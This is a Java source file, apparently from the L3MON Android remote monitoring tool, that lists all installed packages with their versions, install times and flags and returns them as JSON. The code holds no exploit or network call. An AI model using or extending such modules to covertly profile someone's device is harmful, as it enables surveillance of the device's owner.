package com.etechd.l3mon.features.apps;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.util.Log;

import com.etechd.l3mon.core.L3monApp;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class AppList {

    private static final String TAG = "AppList";

    @SuppressLint("QueryPermissionsNeeded")
    public static JSONObject getInstalledApps(boolean includeSystemApps) {
        JSONArray appsArray = new JSONArray();
        JSONObject result = new JSONObject();

        try {
            Context context = L3monApp.getContext();
            PackageManager packageManager = context.getPackageManager();
            int flags = PackageManager.GET_PERMISSIONS;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                flags |= PackageManager.MATCH_UNINSTALLED_PACKAGES;
                flags |= PackageManager.MATCH_DISABLED_COMPONENTS;
            }

            List<PackageInfo> packages = packageManager.getInstalledPackages(flags);
            if (packages == null) {
                result.put("apps", appsArray);
                result.put("error", "Package manager returned no results");
                return result;
            }

            Collections.sort(packages, Comparator.comparing(pkg -> pkg.applicationInfo.loadLabel(packageManager).toString().toLowerCase()));

            for (PackageInfo pkg : packages) {
                try {
                    ApplicationInfo appInfo = pkg.applicationInfo;
                    boolean isSystem = (appInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                    if (!includeSystemApps && isSystem) {
                        continue;
                    }

                    JSONObject appJson = new JSONObject();
                    CharSequence label = appInfo.loadLabel(packageManager);
                    String appName = label != null ? label.toString() : pkg.packageName;
                    String versionName = pkg.versionName != null ? pkg.versionName : "";
                    long versionCode = Build.VERSION.SDK_INT >= Build.VERSION_CODES.P ?
                            pkg.getLongVersionCode() : pkg.versionCode;

                    appJson.put("appName", appName);
                    appJson.put("packageName", pkg.packageName);
                    appJson.put("versionName", versionName);
                    appJson.put("versionCode", versionCode);
                    appJson.put("isSystem", isSystem);
                    appJson.put("isEnabled", appInfo.enabled);
                    appJson.put("firstInstallTime", pkg.firstInstallTime);
                    appJson.put("lastUpdateTime", pkg.lastUpdateTime);

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        appJson.put("category", appInfo.category);
                    }

                    appsArray.put(appJson);

                } catch (JSONException e) {
                    Log.e(TAG, "Error constructing app JSON", e);
                }
            }

            result.put("apps", appsArray);
            result.put("includeSystem", includeSystemApps);
            result.put("totalPackages", packages.size());
            result.put("returnedPackages", appsArray.length());

            if (!includeSystemApps && appsArray.length() < packages.size()) {
                result.put("filtered", packages.size() - appsArray.length());
            }

        } catch (SecurityException securityException) {
            Log.e(TAG, "Missing QUERY_ALL_PACKAGES permission", securityException);
            try {
                result.put("error", "Missing QUERY_ALL_PACKAGES permission");
                result.put("apps", appsArray);
            } catch (JSONException ignored) {
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrieving installed apps", e);
            try {
                result.put("error", e.getMessage() != null ? e.getMessage() : "Failed to enumerate apps");
                result.put("apps", appsArray);
            } catch (JSONException ignored) {
            }
        }

        return result;
    }
}
